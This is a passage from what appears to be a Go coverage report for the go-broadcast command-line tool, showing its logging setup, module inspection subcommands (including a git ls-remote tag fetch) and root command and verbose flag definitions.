}</span>

// mapVerboseLevelWithError maps verbose count to logrus levels with error handling.
//
// This function implements the same mapping as mapVerboseToLevel but returns
// errors for invalid configurations instead of silently defaulting.
//
// Returns:
// - Appropriate logrus.Level based on configuration
// - Error if configuration is invalid
func (s *LoggerService) mapVerboseLevelWithError() (logrus.Level, error) <span class="cov8" title="1">{
        // If verbose flag is used, it overrides explicit log level
        if s.config.Verbose &gt; 0 </span><span class="cov8" title="1">{
                switch s.config.Verbose </span>{
                case 1:<span class="cov8" title="1">
                        return logrus.DebugLevel, nil</span>
                case 2:<span class="cov8" title="1">
                        return TraceLevel, nil</span>
                default:<span class="cov8" title="1"> // 3 or higher
                        return TraceLevel, nil</span>
                }
        }

        // Fall back to explicit log level if no verbose flag
        <span class="cov8" title="1">if s.config.LogLevel == "" </span><span class="cov8" title="1">{
                return logrus.InfoLevel, nil
        }</span>

        <span class="cov8" title="1">level, err := logrus.ParseLevel(s.config.LogLevel)
        if err != nil </span><span class="cov8" title="1">{
                return logrus.InfoLevel, fmt.Errorf("invalid log level %q: %w", s.config.LogLevel, err)
        }</span>

        <span class="cov8" title="1">return level, nil</span>
}
</pre>

		<pre class="file" id="file13" style="display: none">package cli

import (
        "context"
        "errors"
        "fmt"
        "os/exec"
        "path/filepath"
        "sort"
        "strings"
        "time"

        "github.com/sirupsen/logrus"
        "github.com/spf13/cobra"

        "github.com/mrz1836/go-broadcast/internal/config"
        "github.com/mrz1836/go-broadcast/internal/output"
        "github.com/mrz1836/go-broadcast/internal/sync"
)

// Static errors for err113 compliance
var (
        ErrModuleNotFound         = errors.New("module not found")
        ErrModuleValidationFailed = errors.New("module validation failed")
        ErrInvalidRepositoryPath  = errors.New("invalid repository path")
)

//nolint:gochecknoglobals // Cobra commands are designed to be global variables
var modulesCmd = &amp;cobra.Command{
        Use:   "modules",
        Short: "Manage and inspect module configurations",
        Long: `Manage and inspect module configurations in go-broadcast.

Provides tools for working with module-aware synchronization, including:
  ‚Ä¢ Listing detected modules in source repositories
  ‚Ä¢ Showing module details and versions
  ‚Ä¢ Validating module configurations
  ‚Ä¢ Checking available versions from git tags`,
        Example: `  # List all modules in configuration
  go-broadcast modules list

  # Show details for a specific module
  go-broadcast modules show github.com/example/module

  # Show available versions for a module
  go-broadcast modules versions github.com/example/module

  # Validate module configurations
  go-broadcast modules validate`,
}

//nolint:gochecknoglobals // Cobra commands are designed to be global variables
var listModulesCmd = &amp;cobra.Command{
        Use:   "list",
        Short: "List all detected modules in configuration",
        Long: `List all modules detected in the source repositories defined in configuration.

Scans directories configured with module settings and displays:
  ‚Ä¢ Module path and version
  ‚Ä¢ Source location
  ‚Ä¢ Target repositories
  ‚Ä¢ Version constraints`,
        Example: `  go-broadcast modules list
  go-broadcast modules list --config sync.yaml`,
        RunE: runListModules,
}

//nolint:gochecknoglobals // Cobra commands are designed to be global variables
var showModuleCmd = &amp;cobra.Command{
        Use:   "show [module-path]",
        Short: "Show details for a specific module",
        Long: `Show detailed information about a specific module.

Displays:
  ‚Ä¢ Module configuration
  ‚Ä¢ Current version settings
  ‚Ä¢ Target repositories using this module
  ‚Ä¢ Source repository information`,
        Example: `  go-broadcast modules show github.com/example/errors
  go-broadcast modules show pkg/utils`,
        Args: cobra.ExactArgs(1),
        RunE: runShowModule,
}

//nolint:gochecknoglobals // Cobra commands are designed to be global variables
var moduleVersionsCmd = &amp;cobra.Command{
        Use:   "versions [module-path]",
        Short: "Show available versions for a module",
        Long: `Show available versions for a module from git tags.

Fetches and displays:
  ‚Ä¢ Available git tags that look like versions
  ‚Ä¢ Latest stable version
  ‚Ä¢ Compatibility with current constraints`,
        Example: `  go-broadcast modules versions github.com/example/errors
  go-broadcast modules versions pkg/utils`,
        Args: cobra.ExactArgs(1),
        RunE: runModuleVersions,
}

//nolint:gochecknoglobals // Cobra commands are designed to be global variables
var validateModulesCmd = &amp;cobra.Command{
        Use:   "validate",
        Short: "Validate module configurations",
        Long: `Validate all module configurations in the sync configuration.

Checks:
  ‚Ä¢ Module paths are valid
  ‚Ä¢ Version constraints are parseable
  ‚Ä¢ Modules exist in source repositories
  ‚Ä¢ Version constraints can be satisfied`,
        Example: `  go-broadcast modules validate
  go-broadcast modules validate --config sync.yaml`,
        RunE: runValidateModules,
}

//nolint:gochecknoinits // Cobra commands require init() for setup
func init() <span class="cov8" title="1">{
        // Add subcommands
        modulesCmd.AddCommand(listModulesCmd)
        modulesCmd.AddCommand(showModuleCmd)
        modulesCmd.AddCommand(moduleVersionsCmd)
        modulesCmd.AddCommand(validateModulesCmd)
}</span>

func runListModules(cmd *cobra.Command, _ []string) error <span class="cov8" title="1">{
        _ = cmd.Context()
        _ = logrus.WithField("command", "modules-list")

        // Load configuration
        cfg, err := loadConfig()
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to load configuration: %w", err)
        }</span>

        // Get all groups
        <span class="cov8" title="1">groups := cfg.Groups
        if len(groups) == 0 </span><span class="cov0" title="0">{
                output.Info("No groups configured")
                return nil
        }</span>

        <span class="cov8" title="1">output.Info("=== Configured Modules ===")
        output.Info("")

        moduleCount := 0
        for _, group := range groups </span><span class="cov8" title="1">{
                groupHasModules := false

                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        for _, dir := range target.Directories </span><span class="cov8" title="1">{
                                if dir.Module != nil </span><span class="cov8" title="1">{
                                        if !groupHasModules </span><span class="cov8" title="1">{
                                                output.Info(fmt.Sprintf("Group: %s (%s)", group.Name, group.ID))
                                                groupHasModules = true
                                        }</span>

                                        <span class="cov8" title="1">moduleCount++
                                        output.Info(fmt.Sprintf("  Module %d:", moduleCount))
                                        output.Info(fmt.Sprintf("    Source: %s", dir.Src))
                                        output.Info(fmt.Sprintf("    Target: %s -&gt; %s", target.Repo, dir.Dest))
                                        output.Info(fmt.Sprintf("    Type: %s", getModuleType(dir.Module.Type)))
                                        output.Info(fmt.Sprintf("    Version: %s", dir.Module.Version))

                                        if dir.Module.CheckTags != nil </span><span class="cov0" title="0">{
                                                output.Info(fmt.Sprintf("    Check Tags: %v", *dir.Module.CheckTags))
                                        }</span>
                                        <span class="cov8" title="1">if dir.Module.UpdateRefs </span><span class="cov0" title="0">{
                                                output.Info("    Update References: true")
                                        }</span>
                                        <span class="cov8" title="1">output.Info("")</span>
                                }
                        }
                }

                <span class="cov8" title="1">if groupHasModules </span><span class="cov8" title="1">{
                        output.Info("")
                }</span>
        }

        <span class="cov8" title="1">if moduleCount == 0 </span><span class="cov8" title="1">{
                output.Info("No modules configured")
        }</span> else<span class="cov8" title="1"> {
                output.Success(fmt.Sprintf("Total modules configured: %d", moduleCount))
        }</span>

        <span class="cov8" title="1">return nil</span>
}

func runShowModule(cmd *cobra.Command, args []string) error <span class="cov8" title="1">{
        _ = cmd.Context()
        modulePath := args[0]
        _ = logrus.WithField("command", "modules-show")

        // Load configuration
        cfg, err := loadConfig()
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to load configuration: %w", err)
        }</span>

        <span class="cov8" title="1">output.Info(fmt.Sprintf("=== Module: %s ===", modulePath))
        output.Info("")

        found := false
        groups := cfg.Groups

        for _, group := range groups </span><span class="cov8" title="1">{
                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        for _, dir := range target.Directories </span><span class="cov8" title="1">{
                                if dir.Module != nil &amp;&amp; (dir.Src == modulePath || dir.Dest == modulePath) </span><span class="cov0" title="0">{
                                        found = true

                                        output.Info(fmt.Sprintf("Group: %s (%s)", group.Name, group.ID))
                                        output.Info(fmt.Sprintf("  Source Repository: %s", group.Source.Repo))
                                        output.Info(fmt.Sprintf("  Source Directory: %s", dir.Src))
                                        output.Info(fmt.Sprintf("  Target Repository: %s", target.Repo))
                                        output.Info(fmt.Sprintf("  Target Directory: %s", dir.Dest))
                                        output.Info("")

                                        output.Info("Module Configuration:")
                                        output.Info(fmt.Sprintf("  Type: %s", getModuleType(dir.Module.Type)))
                                        output.Info(fmt.Sprintf("  Version: %s", dir.Module.Version))

                                        if dir.Module.CheckTags != nil </span><span class="cov0" title="0">{
                                                output.Info(fmt.Sprintf("  Check Tags: %v", *dir.Module.CheckTags))
                                        }</span>
                                        <span class="cov0" title="0">if dir.Module.UpdateRefs </span><span class="cov0" title="0">{
                                                output.Info("  Update References: true")
                                        }</span>

                                        // Show directory mapping settings
                                        <span class="cov0" title="0">if len(dir.Exclude) &gt; 0 </span><span class="cov0" title="0">{
                                                output.Info(fmt.Sprintf("  Exclude Patterns: %v", dir.Exclude))
                                        }</span>
                                        <span class="cov0" title="0">if len(dir.IncludeOnly) &gt; 0 </span><span class="cov0" title="0">{
                                                output.Info(fmt.Sprintf("  Include Only: %v", dir.IncludeOnly))
                                        }</span>

                                        <span class="cov0" title="0">output.Info("")</span>
                                }
                        }
                }
        }

        <span class="cov8" title="1">if !found </span><span class="cov8" title="1">{
                output.Error(fmt.Sprintf("Module not found: %s", modulePath))
                return fmt.Errorf("%w: %s", ErrModuleNotFound, modulePath)
        }</span>

        <span class="cov0" title="0">return nil</span>
}

func runModuleVersions(cmd *cobra.Command, args []string) error <span class="cov8" title="1">{
        ctx := cmd.Context()
        modulePath := args[0]
        logger := logrus.StandardLogger()

        // Load configuration
        cfg, err := loadConfig()
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to load configuration: %w", err)
        }</span>

        // Find the module in configuration
        <span class="cov8" title="1">var sourceRepo string
        var moduleConfig *config.ModuleConfig

        groups := cfg.Groups
        for _, group := range groups </span><span class="cov8" title="1">{
                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        for _, dir := range target.Directories </span><span class="cov8" title="1">{
                                if dir.Module != nil &amp;&amp; (dir.Src == modulePath || filepath.Base(dir.Src) == modulePath) </span><span class="cov0" title="0">{
                                        sourceRepo = group.Source.Repo
                                        moduleConfig = dir.Module
                                        break</span>
                                }
                        }
                }
                <span class="cov8" title="1">if sourceRepo != "" </span><span class="cov0" title="0">{
                        break</span>
                }
        }

        <span class="cov8" title="1">if sourceRepo == "" </span><span class="cov8" title="1">{
                output.Error(fmt.Sprintf("Module not found in configuration: %s", modulePath))
                return fmt.Errorf("%w: %s", ErrModuleNotFound, modulePath)
        }</span>

        <span class="cov0" title="0">output.Info(fmt.Sprintf("=== Available Versions for %s ===", modulePath))
        output.Info(fmt.Sprintf("Source Repository: %s", sourceRepo))
        output.Info("")

        // Create module resolver
        cache := sync.NewModuleCache(5*time.Minute, logger)
        resolver := sync.NewModuleResolver(logger, cache)

        // For fetching versions, we use git ls-remote
        versions, err := fetchGitTags(ctx, sourceRepo)
        if err != nil </span><span class="cov0" title="0">{
                output.Error(fmt.Sprintf("Failed to fetch versions: %v", err))
                return fmt.Errorf("failed to fetch versions: %w", err)
        }</span>

        <span class="cov0" title="0">if len(versions) == 0 </span><span class="cov0" title="0">{
                output.Info("No version tags found in repository")
                return nil
        }</span>

        // Sort versions (newest first)
        <span class="cov0" title="0">sort.Slice(versions, func(i, j int) bool </span><span class="cov0" title="0">{
                return versions[i] &gt; versions[j]
        }</span>)

        <span class="cov0" title="0">output.Info("Available Versions:")
        for i, version := range versions </span><span class="cov0" title="0">{
                if i &gt;= 10 </span><span class="cov0" title="0">{
                        output.Info(fmt.Sprintf("  ... and %d more", len(versions)-10))
                        break</span>
                }
                <span class="cov0" title="0">output.Info(fmt.Sprintf("  ‚Ä¢ %s", version))</span>
        }

        // Show current configuration
        <span class="cov0" title="0">if moduleConfig != nil </span><span class="cov0" title="0">{
                output.Info("")
                output.Info(fmt.Sprintf("Current Configuration: %s", moduleConfig.Version))

                // Try to resolve the version
                checkTags := moduleConfig.CheckTags == nil || *moduleConfig.CheckTags
                resolved, err := resolver.ResolveVersion(ctx, sourceRepo, moduleConfig.Version, checkTags)
                if err != nil </span><span class="cov0" title="0">{
                        output.Warn(fmt.Sprintf("  Warning: Unable to resolve version: %v", err))
                }</span> else<span class="cov0" title="0"> {
                        output.Success(fmt.Sprintf("  Resolves to: %s", resolved))
                }</span>
        }

        <span class="cov0" title="0">return nil</span>
}

func runValidateModules(cmd *cobra.Command, _ []string) error <span class="cov8" title="1">{
        ctx := cmd.Context()
        logger := logrus.StandardLogger()

        // Load configuration
        cfg, err := loadConfig()
        if err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to load configuration: %w", err)
        }</span>

        <span class="cov8" title="1">output.Info("=== Validating Module Configurations ===")
        output.Info("")

        // Create module resolver
        cache := sync.NewModuleCache(5*time.Minute, logger)
        resolver := sync.NewModuleResolver(logger, cache)

        groups := cfg.Groups
        totalModules := 0
        validModules := 0
        errors := []string{}

        for _, group := range groups </span><span class="cov8" title="1">{
                groupModules := 0

                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        for _, dir := range target.Directories </span><span class="cov8" title="1">{
                                if dir.Module == nil </span><span class="cov0" title="0">{
                                        continue</span>
                                }

                                <span class="cov8" title="1">totalModules++
                                groupModules++

                                // Validate module type
                                if dir.Module.Type != "" &amp;&amp; dir.Module.Type != "go" </span><span class="cov0" title="0">{
                                        errors = append(errors, fmt.Sprintf("Invalid module type '%s' for %s (only 'go' is supported)",
                                                dir.Module.Type, dir.Src))
                                        continue</span>
                                }

                                // Validate version constraint
                                <span class="cov8" title="1">if dir.Module.Version == "" </span><span class="cov0" title="0">{
                                        errors = append(errors, fmt.Sprintf("Missing version for module %s", dir.Src))
                                        continue</span>
                                }

                                // Check if source directory exists (would need actual filesystem access)
                                // For now, just validate the version format
                                <span class="cov8" title="1">if dir.Module.Version != "latest" &amp;&amp; !strings.HasPrefix(dir.Module.Version, "v") &amp;&amp;
                                        !strings.Contains(dir.Module.Version, "^") &amp;&amp; !strings.Contains(dir.Module.Version, "~") &amp;&amp;
                                        !strings.Contains(dir.Module.Version, "&gt;") &amp;&amp; !strings.Contains(dir.Module.Version, "&lt;") </span><span class="cov0" title="0">{
                                        output.Warn(fmt.Sprintf("  ‚ö† Unusual version format for %s: %s", dir.Src, dir.Module.Version))
                                }</span>

                                // Try to resolve the version
                                <span class="cov8" title="1">checkTags := dir.Module.CheckTags == nil || *dir.Module.CheckTags
                                resolved, err := resolver.ResolveVersion(ctx, group.Source.Repo, dir.Module.Version, checkTags)
                                if err != nil </span><span class="cov8" title="1">{
                                        errors = append(errors, fmt.Sprintf("Cannot resolve version '%s' for %s: %v",
                                                dir.Module.Version, dir.Src, err))
                                }</span> else<span class="cov0" title="0"> {
                                        output.Success(fmt.Sprintf("  ‚úì Module %s: %s -&gt; %s", dir.Src, dir.Module.Version, resolved))
                                        validModules++
                                }</span>
                        }
                }

                <span class="cov8" title="1">if groupModules &gt; 0 </span><span class="cov8" title="1">{
                        output.Info(fmt.Sprintf("  Group '%s': %d modules", group.Name, groupModules))
                }</span>
        }

        <span class="cov8" title="1">output.Info("")

        // Summary
        if totalModules == 0 </span><span class="cov8" title="1">{
                output.Info("No modules configured to validate")
                return nil
        }</span>

        <span class="cov8" title="1">output.Info("=== Validation Summary ===")
        output.Info(fmt.Sprintf("Total Modules: %d", totalModules))
        output.Info(fmt.Sprintf("Valid: %d", validModules))

        if len(errors) &gt; 0 </span><span class="cov8" title="1">{
                output.Error(fmt.Sprintf("Errors: %d", len(errors)))
                for _, err := range errors </span><span class="cov8" title="1">{
                        output.Error(fmt.Sprintf("  ‚Ä¢ %s", err))
                }</span>
                <span class="cov8" title="1">return fmt.Errorf("%w with %d errors", ErrModuleValidationFailed, len(errors))</span>
        }

        <span class="cov0" title="0">output.Success("All module configurations are valid!")
        return nil</span>
}

// getModuleType returns a readable module type
func getModuleType(moduleType string) string <span class="cov8" title="1">{
        if moduleType == "" </span><span class="cov8" title="1">{
                return "go (default)"
        }</span>
        <span class="cov8" title="1">return moduleType</span>
}

// fetchGitTags fetches git tags from a repository
func fetchGitTags(ctx context.Context, repoPath string) ([]string, error) <span class="cov8" title="1">{
        // Validate repoPath to prevent command injection
        if strings.Contains(repoPath, "..") || strings.Contains(repoPath, ";") || strings.Contains(repoPath, "&amp;") </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("%w: %s", ErrInvalidRepositoryPath, repoPath)
        }</span>

        // Use git ls-remote to fetch tags
        // Format: git ls-remote --tags https://github.com/org/repo
        <span class="cov8" title="1">url := fmt.Sprintf("https://github.com/%s", repoPath)

        //nolint:gosec // Git URL is validated and constructed safely
        cmd := exec.CommandContext(ctx, "git", "ls-remote", "--tags", url)
        output, err := cmd.Output()
        if err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to fetch tags: %w", err)
        }</span>

        <span class="cov0" title="0">var versions []string
        lines := strings.Split(string(output), "\n")
        for _, line := range lines </span><span class="cov0" title="0">{
                if line == "" </span><span class="cov0" title="0">{
                        continue</span>
                }

                // Parse tag from line format: &lt;hash&gt; refs/tags/&lt;tag&gt;
                <span class="cov0" title="0">parts := strings.Fields(line)
                if len(parts) &lt; 2 </span><span class="cov0" title="0">{
                        continue</span>
                }

                <span class="cov0" title="0">tag := parts[1]
                if strings.HasPrefix(tag, "refs/tags/") </span><span class="cov0" title="0">{
                        tagName := strings.TrimPrefix(tag, "refs/tags/")
                        // Skip annotated tag markers (^{})
                        if !strings.HasSuffix(tagName, "^{}") </span><span class="cov0" title="0">{
                                versions = append(versions, tagName)
                        }</span>
                }
        }

        <span class="cov0" title="0">return versions, nil</span>
}
</pre>

		<pre class="file" id="file14" style="display: none">// Package cli implements the command-line interface for go-broadcast.
package cli

import (
        "context"
        "fmt"
        "os"
        "os/signal"
        "strings"
        "syscall"

        "github.com/sirupsen/logrus"
        "github.com/spf13/cobra"

        "github.com/mrz1836/go-broadcast/internal/logging"
        "github.com/mrz1836/go-broadcast/internal/output"
)

// loggerContextKey is a type for context keys to avoid collisions
type loggerContextKey struct{}

// Static errors for command implementations
var (
        ErrStatusNotImplemented = fmt.Errorf("status command not yet implemented for isolated flags")
)

//nolint:gochecknoglobals // Cobra commands are designed to be global variables
var rootCmd = &amp;cobra.Command{
        Use:   "go-broadcast",
        Short: "Synchronize files from source repos to multiple targets",
        Long: `go-broadcast is a stateless File Sync Orchestrator that synchronizes
files from a template repository to multiple target repositories.

Key Features:
‚Ä¢ Stateless architecture - derives all state from GitHub (branches, PRs, commits)
‚Ä¢ File transformations - variable substitution and Go module path updates
‚Ä¢ Comprehensive logging - verbose flags and component-specific debugging
‚Ä¢ Dry-run support - preview changes before applying them
‚Ä¢ Multi-target sync - synchronize to multiple repositories simultaneously
‚Ä¢ Automatic PR creation - creates pull requests for review and merging

Common Use Cases:
‚Ä¢ Sync CI/CD workflows across microservices
‚Ä¢ Maintain consistent documentation standards
‚Ä¢ Update configuration files across multiple repositories
‚Ä¢ Distribute security policies and compliance files`,
        PersistentPreRunE: setupLogging,
        SilenceUsage:      true,
        SilenceErrors:     true,
}

//nolint:gochecknoinits // Cobra commands require init() for flag registration
func init() <span class="cov8" title="1">{
        // Global flags for backward compatibility
        rootCmd.PersistentFlags().StringVarP(&amp;globalFlags.ConfigFile, "config", "c", "sync.yaml", "Path to configuration file")
        rootCmd.PersistentFlags().BoolVar(&amp;globalFlags.DryRun, "dry-run", false, "Preview changes without making them")
        rootCmd.PersistentFlags().StringVar(&amp;globalFlags.LogLevel, "log-level", "info", "Log level (debug, info, warn, error)")

        // New verbose flags are not added to global command to avoid conflicts
        // They will be added to individual commands that use LogConfig

        // Initialize command flags
        initStatus()
        initVersion()
        initCancel()

        // Add commands
        rootCmd.AddCommand(syncCmd)
        rootCmd.AddCommand(statusCmd)
        rootCmd.AddCommand(validateCmd)
        rootCmd.AddCommand(versionCmd)
        rootCmd.AddCommand(diagnoseCmd)
        rootCmd.AddCommand(cancelCmd)
        rootCmd.AddCommand(modulesCmd)
}</span>

// NewRootCmd creates a new isolated root command instance for testing
// This prevents race conditions by avoiding shared global state
func NewRootCmd() *cobra.Command <span class="cov8" title="1">{
        // Create isolated flags for this command instance
        flags := &amp;Flags{
                ConfigFile: "sync.yaml",
                LogLevel:   "info",
        }

        // Create new command instance with isolated setup function
        cmd := &amp;cobra.Command{
                Use:   "go-broadcast",
                Short: "Synchronize files from source repos to multiple targets",
                Long: `go-broadcast is a stateless File Sync Orchestrator that synchronizes
files from a template repository to multiple target repositories.

It derives all state from GitHub (branches, PRs, commits) and never stores
state locally. It supports file transformations and provides progress tracking.`,
                PersistentPreRunE: createSetupLogging(flags),
                SilenceUsage:      true,
                SilenceErrors:     true,
        }

        // Add isolated flags
        cmd.PersistentFlags().StringVarP(&amp;flags.ConfigFile, "config", "c", "sync.yaml", "Path to configuration file")
        cmd.PersistentFlags().BoolVar(&amp;flags.DryRun, "dry-run", false, "Preview changes without making them")
        cmd.PersistentFlags().StringVar(&amp;flags.LogLevel, "log-level", "info", "Log level (debug, info, warn, error)")

        // Add commands with isolated flags
        cmd.AddCommand(createSyncCmd(flags))
        cmd.AddCommand(createStatusCmd(flags))
        cmd.AddCommand(createValidateCmd(flags))
        cmd.AddCommand(createVersionCmd(flags))
        cmd.AddCommand(createDiagnoseCmd(flags))
        cmd.AddCommand(createCancelCmd(flags))

        return cmd
}</span>

// NewRootCmdWithVerbose creates a new root command with verbose flag support
// This provides verbose logging capabilities from Phase 1
func NewRootCmdWithVerbose() *cobra.Command <span class="cov8" title="1">{
        // Create LogConfig for verbose logging support
        logConfig := &amp;LogConfig{
                ConfigFile: "sync.yaml",
                LogLevel:   "info",
                LogFormat:  "text",
        }

        // Create new command instance with logging setup function
        cmd := &amp;cobra.Command{
                Use:   "go-broadcast",
                Short: "Synchronize files from source repos to multiple targets",
                Long: `go-broadcast is a stateless File Sync Orchestrator that synchronizes
files from a template repository to multiple target repositories.

It derives all state from GitHub (branches, PRs, commits) and never stores
state locally. It supports file transformations and provides progress tracking.`,
                PersistentPreRunE: createSetupLoggingWithVerbose(logConfig),
                SilenceUsage:      true,
                SilenceErrors:     true,
        }

        // Add verbose flags with debug support
        addVerboseFlags(cmd, logConfig)

        // Add commands with LogConfig
        cmd.AddCommand(createSyncCmdWithVerbose(logConfig))
        cmd.AddCommand(createStatusCmdWithVerbose(logConfig))
        cmd.AddCommand(createValidateCmdWithVerbose(logConfig))
        cmd.AddCommand(createVersionCmdWithVerbose(logConfig))
        cmd.AddCommand(createDiagnoseCmdWithVerbose(logConfig))
        cmd.AddCommand(createCancelCmdWithVerbose(logConfig))

        return cmd
}</span>

// GetRootCmd returns the root command for testing purposes
func GetRootCmd() *cobra.Command <span class="cov8" title="1">{
        // For backward compatibility and test isolation, return a new isolated instance
        return NewRootCmd()
}</span>

// Execute runs the CLI
func Execute() <span class="cov0" title="0">{
        if err := ExecuteWithContext(context.Background()); err != nil </span><span class="cov0" title="0">{
                output.Error(err.Error())
                os.Exit(1)
        }</span>
}

// ExecuteWithContext runs the CLI with the provided context
// This function is more testable as it returns errors instead of calling os.Exit
func ExecuteWithContext(ctx context.Context) error <span class="cov0" title="0">{
        // Set up context with cancellation
        ctx, cancel := context.WithCancel(ctx)
        defer cancel()

        // Handle interrupt signals
        sigChan := make(chan os.Signal, 1)
        signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

        go func() </span><span class="cov0" title="0">{
                &lt;-sigChan
                output.Warn("Interrupt received, canceling...")
                cancel()
        }</span>()

        // Execute command with context
        <span class="cov0" title="0">return rootCmd.ExecuteContext(ctx)</span>
}

// createSetupLogging creates an isolated logging setup function for the given flags
// It returns a configured logger instance that can be used instead of the global logger
func createSetupLogging(flags *Flags) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(cmd *cobra.Command, _ []string) error </span><span class="cov8" title="1">{
                // Parse log level
                level, err := logrus.ParseLevel(strings.ToLower(flags.LogLevel))
                if err != nil </span><span class="cov8" title="1">{
                        return fmt.Errorf("invalid log level %q: %w", flags.LogLevel, err)
                }</span>

                // Create isolated logger instance
                <span class="cov8" title="1">logger := logrus.New()
                logger.SetLevel(level)
                logger.SetFormatter(&amp;logrus.TextFormatter{
                        DisableColors:    false,
                        FullTimestamp:    true,
                        TimestampFormat:  "15:04:05",
                        PadLevelText:     true,
                        QuoteEmptyFields: true,
                })

                // Log to stderr to keep stdout clean for output
                logger.SetOutput(os.Stderr)

                // Store logger in command context for isolated access
                cmd.SetContext(context.WithValue(cmd.Context(), loggerContextKey{}, logger))

                return nil</span>
        }
}

// setupLogging configures the logger based on the log level flag (global version)
func setupLogging(_ *cobra.Command, _ []string) error <span class="cov8" title="1">{
        // Parse log level
        level, err := logrus.ParseLevel(strings.ToLower(globalFlags.LogLevel))
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("invalid log level %q: %w", globalFlags.LogLevel, err)
        }</span>

        // Configure logrus
        <span class="cov8" title="1">logrus.SetLevel(level)
        logrus.SetFormatter(&amp;logrus.TextFormatter{
                DisableColors:    false,
                FullTimestamp:    true,
                TimestampFormat:  "15:04:05",
                PadLevelText:     true,
                QuoteEmptyFields: true,
        })

        // Log to stderr to keep stdout clean for output
        logrus.SetOutput(os.Stderr)

        logrus.WithFields(logrus.Fields{
                "config":    globalFlags.ConfigFile,
                "dry_run":   globalFlags.DryRun,
                "log_level": globalFlags.LogLevel,
        }).Debug("CLI initialized")

        return nil</span>
}

// addVerboseFlags adds verbose and debug flags to the given command.
//
// This function adds the following flags:
// - Verbose flag with counter support (-v, -vv, -vvv)
// - Component-specific debug flags (--debug-git, --debug-api, etc.)
// - Log format flag for output format selection
//
// Parameters:
// - cmd: Cobra command to add flags to
// - config: LogConfig to bind flag values to
func addVerboseFlags(cmd *cobra.Command, config *LogConfig) <span class="cov8" title="1">{
        // Add verbose flag with counter support
        cmd.PersistentFlags().CountVarP(&amp;config.Verbose, "verbose", "v",
                `Increase output verbosity for debugging and monitoring:
  -v    Debug level (detailed operations, timing, status)
  -vv   Trace level (internal operations, API calls)
  -vvv  Trace with caller info (file:line for deep debugging)`)

        // Add component-specific debug flags
        cmd.PersistentFlags().BoolVar(&amp;config.Debug.Git, "debug-git", false,
                "Debug git operations: commands, output, timing, authentication issues")
        cmd.PersistentFlags().BoolVar(&amp;config.Debug.API, "debug-api", false,
                "Debug GitHub API: requests, responses, rate limits, timing")
        cmd.PersistentFlags().BoolVar(&amp;config.Debug.Transform, "debug-transform", false,
                "Debug file transformations: variable substitutions, size changes, content")
        cmd.PersistentFlags().BoolVar(&amp;config.Debug.Config, "debug-config", false,
                "Debug configuration: validation steps, field checks, error details")
        cmd.PersistentFlags().BoolVar(&amp;config.Debug.State, "debug-state", false,
                "Debug state discovery: repository analysis, branch detection, PR status")

        // Add log format flag
        cmd.PersistentFlags().StringVar(&amp;config.LogFormat, "log-format", "text",
                `Output format: "text" (human-readable, colored) or "json" (structured, machine-readable)`)

        // Add JSON output flag (legacy alias for --log-format=json)
        cmd.PersistentFlags().BoolVar(&amp;config.JSONOutput, "json", false,
                "Enable structured JSON output for log aggregation and automation")

        // Add standard flags
        cmd.PersistentFlags().StringVarP(&amp;config.ConfigFile, "config", "c", "sync.yaml",
                "Path to configuration file")
        cmd.PersistentFlags().BoolVar(&amp;config.DryRun, "dry-run", false,
                "Preview changes without making them")
        cmd.PersistentFlags().StringVar(&amp;config.LogLevel, "log-level", "info",
                "Log level (debug, info, warn, error) - overridden by verbose flags")
}</span>

// createSetupLoggingWithVerbose creates a verbose logging setup function.
//
// This function creates a setup function that uses the LoggerService to configure
// logging with support for verbose flags, trace level, and component-specific debugging.
//
// Parameters:
// - config: LogConfig containing logging and debug configuration
//
// Returns:
// - Function that can be used as PersistentPreRunE for Cobra commands
func createSetupLoggingWithVerbose(config *LogConfig) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(cmd *cobra.Command, _ []string) error </span><span class="cov8" title="1">{
                ctx := cmd.Context()

                // Generate correlation ID for this execution
                if config.CorrelationID == "" </span><span class="cov8" title="1">{
                        config.CorrelationID = logging.GenerateCorrelationID()
                }</span>

                // Handle JSON output flag
                <span class="cov8" title="1">if config.JSONOutput </span><span class="cov8" title="1">{
                        config.LogFormat = "json"
                }</span>

                // Create logger service with the configuration
                <span class="cov8" title="1">loggerService := NewLoggerService(config)

                // Configure logrus with verbose logging capabilities
                if err := loggerService.ConfigureLogger(ctx); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to configure logger: %w", err)
                }</span>

                // Configure structured output if JSON format is requested
                <span class="cov8" title="1">if err := logging.ConfigureLogger(logrus.StandardLogger(), config); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to configure structured logging: %w", err)
                }</span>

                // Log initialization details at debug level with correlation ID
                <span class="cov8" title="1">logrus.WithFields(logrus.Fields{
                        logging.StandardFields.CorrelationID: config.CorrelationID,
                        logging.StandardFields.Component:     logging.ComponentNames.CLI,
                        "config":                             config.ConfigFile,
                        "dry_run":                            config.DryRun,
                        "log_level":                          config.LogLevel,
                        "verbose":                            config.Verbose,
                        "log_format":                         config.LogFormat,
                        "json_output":                        config.JSONOutput,
                        "debug_git":                          config.Debug.Git,
                        "debug_api":                          config.Debug.API,
                }).Debug("CLI initialized with verbose logging")

                return nil</span>
        }
}

// createSyncCmdWithVerbose creates a sync command with verbose logging support.
//
// This function creates a sync command that uses LogConfig for verbose logging
// capabilities including verbose flags and component-specific debug settings.
//
// Parameters:
// - config: LogConfig containing logging and debug configuration
//
// Returns:
// - Cobra command configured for sync operations with verbose support
func createSyncCmdWithVerbose(config *LogConfig) *cobra.Command <span class="cov8" title="1">{
        return &amp;cobra.Command{
                Use:   "sync [targets...]",
                Short: "Synchronize files to target repositories",
                Long: `Synchronize files from the source template repository to one or more target repositories.

If no targets are specified, all targets in the configuration file will be synchronized.
Target repositories can be specified as arguments to sync only specific repos.`,
                Example: `  # Basic operations
  go-broadcast sync                        # Sync all targets
